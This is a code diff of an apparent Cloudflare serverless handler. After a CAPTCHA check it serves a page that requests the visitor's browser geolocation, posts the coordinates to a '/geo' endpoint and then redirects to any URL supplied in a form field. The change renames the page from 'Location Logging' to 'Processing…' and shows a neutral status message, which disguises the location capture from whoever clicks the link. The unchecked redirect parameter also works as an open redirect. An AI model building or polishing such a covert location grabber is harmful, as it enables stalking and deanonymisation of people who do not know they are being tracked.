@@ -2,24 +2,25 @@ export async function onRequestPost({ request, env }) {
   const form = await request.formData();
 
   const token = form.get('cf-turnstile-response');
-  const redirect = form.get("redirect") || "https://www.google.com";
+  const redirectParam = form.get("redirect") || "https://www.google.com";
+
+  // read noredirect from query string (not from form)
   const url = new URL(request.url);
   const noredirect = url.searchParams.get("noredirect") === "1";
+
   const ip = request.headers.get("cf-connecting-ip");
 
   if (!token) {
     return new Response("Missing CAPTCHA token", { status: 400 });
   }
 
-  // Validate redirect
   let redirectURL;
   try {
-    redirectURL = new URL(redirect).toString();
+    redirectURL = new URL(redirectParam).toString();
   } catch {
     redirectURL = "https://www.google.com";
   }
 
-  // Verify Turnstile
   const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -31,45 +32,58 @@ export async function onRequestPost({ request, env }) {
   });
 
   const verifyData = await verifyResp.json();
-
   if (!verifyData.success) {
     return new Response("CAPTCHA verification failed", { status: 403 });
   }
 
-  // Inject HTML with geolocation logic
   const html = `
     <!DOCTYPE html>
     <html>
-    <head><title>Location Logging</title></head>
-    <body>
-      <script>
-        const redirect = ${JSON.stringify(redirectURL)};
-        const noredirect = ${noredirect};
-
-        navigator.geolocation.getCurrentPosition(function(location) {
-          fetch('/geo', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              lat: location.coords.latitude,
-              lon: location.coords.longitude
-            })
-          }).finally(function() {
-            if (noredirect) {
-              document.body.innerHTML = "<h2>✅ Location received. Thank you.</h2>";
-            } else {
-              window.location.href = redirect;
-            }
-          });
-        }, function() {
-          if (noredirect) {
-            document.body.innerHTML = "<h2>⚠️ Location access denied.</h2>";
-          } else {
-            window.location.href = redirect;
+      <head><title>Processing…</title></head>
+      <body>
+        <div id="status">Processing...</div>
+        <script>
+          const redirect = ${JSON.stringify(redirectURL)};
+          const noredirect = ${noredirect};
+          function showMessage(msg) {
+            document.getElementById('status').innerText = msg;
           }
-        });
-      </script>
-    </body>
+
+          navigator.geolocation.getCurrentPosition(
+            function(location) {
+              fetch('/geo', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  lat: location.coords.latitude,
+                  lon: location.coords.longitude
+                })
+              })
+              .then(() => {
+                if (noredirect) {
+                  showMessage("✅ Location received. Thank you.");
+                } else {
+                  window.location.href = redirect;
+                }
+              })
+              .catch(() => {
+                if (noredirect) {
+                  showMessage("⚠️ Location logged, but an error occurred.");
+                } else {
+                  window.location.href = redirect;
+                }
+              });
+            },
+            function(error) {
+              if (noredirect) {
+                showMessage("⚠️ Location access denied. Thank you.");
+              } else {
+                window.location.href = redirect;
+              }
+            }
+          );
+        </script>
+      </body>
     </html>
   `;
 
